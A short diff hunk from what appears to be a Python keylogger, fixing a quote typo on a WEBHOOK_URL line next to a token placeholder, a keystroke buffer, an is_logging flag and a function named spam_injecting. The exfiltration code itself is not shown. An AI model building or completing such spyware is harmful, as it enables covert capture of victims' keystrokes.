@@ -50,7 +50,7 @@ async def spam_injecting():
         await asyncio.sleep(0.1)
 
 TOKEN = 'sex'
-WEBHOOK_URL = 'sex''
+WEBHOOK_URL = 'sex'
 
 keystrokes = ""  
 is_logging = False  
